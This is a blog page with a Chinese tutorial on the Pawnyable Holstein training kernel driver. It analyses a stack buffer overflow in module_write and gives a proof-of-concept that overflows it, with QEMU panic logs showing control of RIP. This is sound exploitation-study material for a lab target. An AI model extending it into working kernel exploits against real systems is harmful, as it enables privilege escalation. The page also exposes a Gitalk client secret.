@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    ztree
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+<meta name="author" content="ztree">
+<meta name="description" content="竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生。">
+<meta name="keywords" content="Binary">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://lzxzl.github.io/styles/main.css" />
+<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                        <!--CDN样式-->
+                        <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://lzxzl.github.io">
+                    ztree
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://lzxzl.github.io">
+                            ztree
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+
+
+    <script>
+        (function(a, h, g, f, e, d, c, b) {
+            b = function() {
+                d = h.createElement(g);
+                c = h.getElementsByTagName(g)[0];
+                d.src = e;
+                d.charset = "utf-8";
+                d.async = 1;
+                c.parentNode.insertBefore(d, c)
+            };
+            a["SeniverseWeatherWidgetObject"] = f;
+            a[f] || (a[f] = function() {
+                (a[f].q = a[f].q || []).push(arguments)
+            });
+            a[f].l = +new Date();
+            if (a.attachEvent) {
+                a.attachEvent("onload", b)
+            } else {
+                a.addEventListener("load", b, false)
+            }
+        }(window, document, "script", "SeniverseWeatherWidget", "//cdn.sencdn.com/widget2/static/js/bundle.js?t=" + parseInt((new Date().getTime() / 100000000).toString(), 10)));
+        window.SeniverseWeatherWidget('show', {
+            flavor: "slim",
+            location: "WWEFQFPJZ7T8",
+            geolocation: true,
+            language: "auto",
+            unit: "c",
+            theme: "auto",
+            token: "61bcc333-3305-4728-9465-6785274bb0a3",
+            hover: "enabled",
+            container: "tp-weather-widget"
+        })
+    </script>
+    
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                Pawnyable4 - 熟悉Holstein模块与触发漏洞
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            ztree
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2023-03-12</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">11.8
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">2249</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://lzxzl.github.io/tag/LKPWN/">Linux Kernel PWN</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>首先回顾一下初始化的过程：<code>/init</code> -&gt; <code>/sbin/init</code> -&gt;......-&gt;<code>/etc/init.d/rcS</code>-&gt;<code>/etc/init.d/S99pawnyable</code></p>
+<pre><code class="language-shell"># /etc/init.d/S99pawnyable
+#!/bin/sh
+
+##
+## Setup
+##
+mdev -s
+mount -t proc none /proc
+mkdir -p /dev/pts
+mount -vt devpts -o gid=4,mode=620 none /dev/pts
+chmod 666 /dev/ptmx
+stty -opost
+#echo 2 &gt; /proc/sys/kernel/kptr_restrict  # 禁用KADR
+#echo 1 &gt; /proc/sys/kernel/dmesg_restrict # 禁用dmesg_restrict
+
+##
+## Install driver
+##
+insmod /root/vuln.ko  # 加载内核模块
+# 将名为的/dev/holstein模块与名为holstein的字符设备文件关联
+mknod -m 666 /dev/holstein c `grep holstein /proc/devices | awk '{print $1;}'` 0 
+
+##
+## User shell
+##
+echo -e &quot;\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n&quot;
+echo &quot;[ Holstein v1 (LK01) - Pawnyable ]&quot;
+#setsid cttyhack setuidgid 1337 sh     # 以用户ID 1337 运行 shell，即普通用户
+setsid cttyhack setuidgid 0 sh         # 以用户ID 0 运行 shell，即root用户
+
+##
+## Cleanup
+##
+umount /proc
+poweroff -d 0 -f
+</code></pre>
+<h1 id="holstein模块">Holstein模块</h1>
+<p><code>src/vuln.c</code>是内核子模块Holstein的源码，下面来分析一下linux里内核子模块是怎么写的：</p>
+<h2 id="初始化和退出">初始化和退出</h2>
+<p>编写内核模块时，总是先编写初始化和退出，这里指定了初始化函数和退出函数</p>
+<pre><code class="language-c">108 module_init(module_initialize);
+109 module_exit(module_cleanup);
+</code></pre>
+<p>先来看初始化函数：</p>
+<pre><code class="language-c">/**
+* 
+* int alloc_chrdev_region(dev_t *dev,unsigned int firstminor,unsigned int count,char *name);
+* 	功能：用于动态申请设备编号
+* 	firstminor：通常为0
+*		dev：存放返回的设备号
+*
+*
+* void cdev_init(struct cdev *, const struct file_operations *)
+* 	功能：初始化一个静态分配的cdev结构体变量
+*		第一个参数：第一个参数表示一个字符设备，在函数中即将被初始化
+*		第二个参数：file_operations结构体类型的指针，通过这个结构体中提供的函数完成对设备的操作
+*
+*
+* THIS_MODULE：是一个宏，定义为：#define THIS_MODULE (&amp;__this_module)
+* 	而__this_module是一个struct module变量，代表当前模块
+*
+*
+* int cdev_add(struct cdev *, dev_t, unsigned)
+* 	功能：向Linux内核系统中添加一个新的cdev结构体变量所描述的字符设备，并且使这个设备立即可用
+* 	第一个参数：即将被添加入Linux内核系统的字符设备
+* 	第二个参数：设备的设备号
+* 	第三个参数：想注册设备的设备号的范围，用于给struct cdev中的字段count赋值
+**/
+
+
+  8 MODULE_LICENSE(&quot;GPL&quot;);
+  9 MODULE_AUTHOR(&quot;ptr-yudai&quot;);
+ 10 MODULE_DESCRIPTION(&quot;Holstein v1 - Vulnerable Kernel Driver for Pawnyable&quot;);
+ 11
+ 12 #define DEVICE_NAME &quot;holstein&quot;
+ 13 #define BUFFER_SIZE 0x400
+ 14
+ 15 char *g_buf = NULL; 
+
+ 80 static dev_t dev_id;
+ 81 static struct cdev c_dev;
+ 82
+ 83 static int __init module_initialize(void)
+ 84 {
+ 85   if (alloc_chrdev_region(&amp;dev_id, 0, 1, DEVICE_NAME)) { // 给字符设备 holstein 分配设备号dev_id
+ 86     printk(KERN_WARNING &quot;Failed to register device\n&quot;);
+ 87     return -EBUSY;
+ 88   }
+ 89
+ 90   cdev_init(&amp;c_dev, &amp;module_fops); // 初始化字符设备c_dev
+ 91   c_dev.owner = THIS_MODULE;
+ 92
+ 93   if (cdev_add(&amp;c_dev, dev_id, 1)) { // 向Linux内核系统中添加字符设备
+ 94     printk(KERN_WARNING &quot;Failed to add cdev\n&quot;);
+ 95     unregister_chrdev_region(dev_id, 1);
+ 96     return -EBUSY;
+ 97   }
+ 98
+ 99   return 0;
+100 }
+</code></pre>
+<p>该字符设备定义了4个操作函数：open、read、write和release</p>
+<pre><code class="language-c"> 71 static struct file_operations module_fops =
+ 72   {
+ 73    .owner   = THIS_MODULE,
+ 74    .read    = module_read,
+ 75    .write   = module_write,
+ 76    .open    = module_open,
+ 77    .release = module_close,
+ 78   };
+</code></pre>
+<p>而模块的退出只是删除了字符设备：</p>
+<pre><code class="language-c">102 static void __exit module_cleanup(void)
+103 {
+104   cdev_del(&amp;c_dev);
+105   unregister_chrdev_region(dev_id, 1);
+106 }
+</code></pre>
+<h2 id="open">open</h2>
+<p>open这个模块的时候，分配了0x400字节的空间给全局变量<code>g_buf</code></p>
+<pre><code class="language-c"> 13 #define BUFFER_SIZE 0x400
+ 14
+ 15 char *g_buf = NULL; 
+
+ 17 static int module_open(struct inode *inode, struct file *file)
+ 18 {
+      // 将字符串打印到内核的日志缓冲区
+      // KERN_INFO是日志级别
+      // 可以使用命令dmesg来查看输出
+ 19   printk(KERN_INFO &quot;module_open called\n&quot;); 
+ 20
+      // 从内核空间中分配0x400大小的堆块给g_buf
+ 21   g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
+ 22   if (!g_buf) {
+ 23     printk(KERN_INFO &quot;kmalloc failed&quot;);
+ 24     return -ENOMEM;
+ 25   }
+ 26
+ 27   return 0;
+ 28 }
+</code></pre>
+<h2 id="close">close</h2>
+<p>释放<code>g_buf</code></p>
+<pre><code class="language-c"> 64 static int module_close(struct inode *inode, struct file *file)
+ 65 {
+ 66   printk(KERN_INFO &quot;module_close called\n&quot;);
+ 67   kfree(g_buf);
+ 68   return 0;
+ 69 }
+</code></pre>
+<h2 id="read">read</h2>
+<p>将内核空间中 <code>g_buf</code> 的内容，最终拷贝到来自用户空间的<code>read</code>函数的参数<code>buf</code></p>
+<pre><code class="language-c"> 30 static ssize_t module_read(struct file *file,
+ 31                         char __user *buf, size_t count,
+ 32                         loff_t *f_pos)
+ 33 {
+ 34   char kbuf[BUFFER_SIZE] = { 0 };
+ 35
+ 36   printk(KERN_INFO &quot;module_read called\n&quot;);
+ 37
+ 38   memcpy(kbuf, g_buf, BUFFER_SIZE); // 将g_buf的内容拷贝到局部变量kbuf
+ 39   if (_copy_to_user(buf, kbuf, count)) { // 将kbuf的内容拷贝到用户空间的buf
+ 40     printk(KERN_INFO &quot;copy_to_user failed\n&quot;);
+ 41     return -EINVAL;
+ 42   }
+ 43
+ 44   return count;
+ 45 }
+</code></pre>
+<h2 id="write">write</h2>
+<p>将用户空间的buf的内容，最终拷贝到内核空间的全局变量<code>g_buf</code></p>
+<pre><code class="language-c"> 47 static ssize_t module_write(struct file *file,
+ 48                             const char __user *buf, size_t count,
+ 49                             loff_t *f_pos)
+ 50 {
+ 51   char kbuf[BUFFER_SIZE] = { 0 };
+ 52
+ 53   printk(KERN_INFO &quot;module_write called\n&quot;);
+ 54
+ 55   if (_copy_from_user(kbuf, buf, count)) { // 将用户空间的buf的内容拷贝到局部变量kbuf
+ 56     printk(KERN_INFO &quot;copy_from_user failed\n&quot;);
+ 57     return -EINVAL;
+ 58   }
+ 59   memcpy(g_buf, kbuf, BUFFER_SIZE); // 将kbuf的内容拷贝到全局变量g_buf
+ 60
+ 61   return count;
+ 62 }
+</code></pre>
+<h1 id="栈溢出漏洞">栈溢出漏洞</h1>
+<p><code>g_buf</code>的长度是0x400，而在上面的<code>module_write()</code>函数中，<code>_copy_from_user</code>的参数<code>count</code>是攻击者可控的，所以可能发生栈溢出（越界写）。进而可以覆写内核栈中的返回地址，并执行ROP链。</p>
+<h1 id="触发漏洞">触发漏洞</h1>
+<p>在利用漏洞之前，先来尝试触发它，也就是写个POC。</p>
+<pre><code class="language-c">// exploit.c（偷懒。。没改名字）
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+
+void fatal(const char *msg){
+        perror(msg);
+        exit(1);
+}
+
+int main() {
+        int fd = open(&quot;/dev/holstein&quot;, O_RDWR);
+        if(fd == -1){
+                fatal(&quot;open(\&quot;/dev/holstein\&quot;)&quot;);
+        }
+
+        char buf[0x800] = {};
+        memset(buf, 'A', 0x800);
+        write(fd, buf, 0x800);
+
+        close(fd);
+        return 0;
+}
+</code></pre>
+<p>然后执行transfer.sh，将poc传送进去，然后在shell里执行：</p>
+<pre><code class="language-shell">lzx@ubuntu:~/LKPWN/pawnyable/LK01/qemu$ ./transfer.sh
+3959 blocks
+qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
+Starting syslogd: OK
+Starting klogd: OK
+Running sysctl: OK
+Saving random seed: OK
+Starting network: udhcpc: started, v1.34.0
+udhcpc: broadcasting discover
+udhcpc: broadcasting select for 10.0.2.15, server 10.0.2.2
+udhcpc: lease of 10.0.2.15 obtained from 10.0.2.2, lease time 86400
+deleting routers
+adding dns 10.0.2.3
+OK
+Starting dhcpcd...
+dhcpcd-9.4.0 starting
+DUID 00:01:00:01:2b:9f:a7:9c:52:54:00:12:34:56
+eth0: IAID 00:12:34:56
+eth0: soliciting an IPv6 router
+eth0: Router Advertisement from fe80::2
+eth0: adding address fec0::d946:4e76:702f:7f8e/64
+eth0: adding route to fec0::/64
+eth0: adding default route via fe80::2
+eth0: soliciting a DHCP lease
+eth0: offered 10.0.2.15 from 10.0.2.2
+eth0: leased 10.0.2.15 for 86400 seconds
+eth0: adding route to 10.0.2.0/24
+eth0: adding default route via 10.0.2.2
+forked to background, child pid 105
+
+Boot took 6.75 seconds
+
+[ Holstein v1 (LK01) - Pawnyable ]
+/ # ./exploit
+BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____))
+kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI
+CPU: 0 PID: 162 Comm: exploit Tainted: G           O      5.10.7 #1
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
+RIP: 0010:memset_orig+0x33/0xb0
+Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 &lt;48&gt; 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47
+RSP: 0018:ffffc9000044ba58 EFLAGS: 00000207
+RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009
+RDX: 00000000000002a8 RSI: 0000000000000000 RDI: ffffc9000044c000
+RBP: ffffc9000044ba78 R08: 4141414141414141 R09: 0000000000000000
+R10: ffffc9000044c000 R11: 4141414141414141 R12: ffffc9000044baa8
+R13: 00000000000002a8 R14: 00007ffd3f100c60 R15: ffffc9000044bef8
+FS:  00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: ffffc9000044c000 CR3: 00000000032b6000 CR4: 00000000000006f0
+Call Trace:
+ ? _copy_from_user+0x70/0x80
+ module_write+0x75/0xef [vuln]
+Modules linked in: vuln(O)
+---[ end trace b57c9adbb0ec8f53 ]---
+RIP: 0010:memset_orig+0x33/0xb0
+Code: 01 01 01 01 01 01 01 01 48 0f af c1 41 89 f9 41 83 e1 07 75 70 48 89 d1 48 c1 e9 06 74 39 66 0f 1f 84 00 00 00 00 00 48 ff c9 &lt;48&gt; 89 07 48 89 47 08 48 89 47 10 48 89 47 18 48 89 47 20 48 89 47
+RSP: 0018:ffffc9000044ba58 EFLAGS: 00000207
+RAX: 0000000000000000 RBX: 0000000000000558 RCX: 0000000000000009
+RDX: 00000000000002a8 RSI: 0000000000000000 RDI: ffffc9000044c000
+RBP: ffffc9000044ba78 R08: 4141414141414141 R09: 0000000000000000
+R10: ffffc9000044c000 R11: 4141414141414141 R12: ffffc9000044baa8
+R13: 00000000000002a8 R14: 00007ffd3f100c60 R15: ffffc9000044bef8
+FS:  00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: ffffc9000044c000 CR3: 00000000032b6000 CR4: 00000000000006f0
+Kernel panic - not syncing: Fatal exception
+Kernel Offset: disabled
+</code></pre>
+<p>确实崩溃了，而RIP的值如下，不是想要的0x4141414141414141。（如果是0x4141414141414141，那么就说明可以控制栈里的返回地址）</p>
+<pre><code class="language-shell">RIP: 0010:memset_orig+0x33/0xb0
+</code></pre>
+<p>看看崩溃的原因，栈溢出导致stack guard page（栈保护页）被写了，然后系统检测到了就崩溃了。</p>
+<pre><code class="language-shell">BUG: stack guard page was hit at (____ptrval____) (stack is (____ptrval____)..(____ptrval____))
+kernel stack overflow (page fault): 0000 [#1] PREEMPT SMP NOPTI
+</code></pre>
+<p>所以是写太多了，修改poc，把数据的长度写成0x420试试。</p>
+<pre><code class="language-c">        char buf[0x420] = {};
+        memset(buf, 'A', 0x420);
+        write(fd, buf, 0x420);
+</code></pre>
+<p>再次运行，果然RIP可控了：</p>
+<pre><code class="language-shell">/ # ./exploit
+general protection fault: 0000 [#1] PREEMPT SMP NOPTI
+CPU: 0 PID: 162 Comm: exploit Tainted: G           O      5.10.7 #1
+Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
+RIP: 0010:0x4141414141414141   &lt;--- RIP可控
+Code: Unable to access opcode bytes at RIP 0x4141414141414117.
+RSP: 0018:ffffc9000044beb8 EFLAGS: 00000202
+RAX: 0000000000000420 RBX: ffff88800318ad00 RCX: 0000000000000000
+RDX: 000000000000007f RSI: ffffc9000044bea8 RDI: ffff888003297800
+RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141
+R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420
+R13: 0000000000000000 R14: 00007fff598abd30 R15: ffffc9000044bef8
+FS:  00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 0000000000601fd8 CR3: 00000000032e2000 CR4: 00000000000006f0
+Call Trace:
+ ? ksys_write+0x53/0xd0
+ ? __x64_sys_write+0x15/0x20
+ ? do_syscall_64+0x38/0x50
+ ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
+Modules linked in: vuln(O)
+---[ end trace da72dd73f8a32261 ]---
+RIP: 0010:0x4141414141414141
+Code: Unable to access opcode bytes at RIP 0x4141414141414117.
+RSP: 0018:ffffc9000044beb8 EFLAGS: 00000202
+RAX: 0000000000000420 RBX: ffff88800318ad00 RCX: 0000000000000000
+RDX: 000000000000007f RSI: ffffc9000044bea8 RDI: ffff888003297800
+RBP: 4141414141414141 R08: 4141414141414141 R09: 4141414141414141
+R10: 4141414141414141 R11: 4141414141414141 R12: 0000000000000420
+R13: 0000000000000000 R14: 00007fff598abd30 R15: ffffc9000044bef8
+FS:  00000000006021d8(0000) GS:ffff888003800000(0000) knlGS:0000000000000000
+CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+CR2: 0000000000601fd8 CR3: 00000000032e2000 CR4: 00000000000006f0
+Kernel panic - not syncing: Fatal exception
+Kernel Offset: disabled
+</code></pre>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://pawnyable.cafe/linux-kernel/LK01/welcome-to-holstein.html</li>
+<li>https://deepinout.com/linux-kernel-api/device-driver-and-device-management/linux-kernel-api-cdev_init.html</li>
+</ul>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#holstein%E6%A8%A1%E5%9D%97">Holstein模块</a>
+<ul>
+<li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E5%92%8C%E9%80%80%E5%87%BA">初始化和退出</a></li>
+<li><a href="#open">open</a></li>
+<li><a href="#close">close</a></li>
+<li><a href="#read">read</a></li>
+<li><a href="#write">write</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E">栈溢出漏洞</a></li>
+<li><a href="#%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E">触发漏洞</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">参考文献</a></li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>ztree</span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/">https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
+                                            
+                                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/&sharesource=qzone&title=Pawnyable4 - 熟悉Holstein模块与触发漏洞&pics=https://lzxzl.github.io/images/avatar.png?v=1747748455692&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://lzxzl.github.io/post/pawnyable4-shou-xi-holstein-mo-kuai-yu-hong-fa-lou-dong/&sharesource=weibo&title=Pawnyable4 - 熟悉Holstein模块与触发漏洞 + " - " + &pic="https://lzxzl.github.io/images/avatar.png?v=1747748455692 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://lzxzl.github.io/tag/LKPWN/">#
+                    Linux Kernel PWN
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://lzxzl.github.io/post/codeql-ru-men-u-boot-challenge/">
+                                                                                            CodeQL入门 - U-Boot Challenge
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://lzxzl.github.io/post/pawnyable3-bian-yi-he-chuan-shu-exp/">
+                                                                                                    Pawnyable3 - 编译和传输exp
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '2a44a295dd16ae7d05b8',
+        clientSecret: '8030257bc11446a193cf383767567daca0e26312',
+        repo: 'lzxzl.github.io',
+        owner: 'lzxzl',
+        admin: ['lzxzl'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        ztree
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        ztree &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://lzxzl.github.io/" target="_blank">
+                                                ztree
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                off
+            </div>
+            
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1747748455692);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
